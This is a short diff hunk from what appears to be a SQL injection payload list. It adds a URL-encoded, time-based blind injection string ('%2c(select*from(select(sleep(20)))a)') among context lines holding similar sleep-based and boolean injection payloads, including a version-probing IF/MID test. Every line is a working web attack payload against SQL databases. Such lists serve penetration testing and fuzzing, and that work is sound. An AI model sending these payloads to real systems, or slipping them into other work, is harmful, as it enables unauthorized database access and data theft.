@@ -3,6 +3,7 @@ or sleep(20) #
 'select sleep(20);--
 1'=sleep(10)='1
 '=IF(MID(VERSION(),1,1)=1,SLEEP(10),0)='1
+%2c(select*from(select(sleep(20)))a)
 1 ' or true# 
 1 ' or false#
 
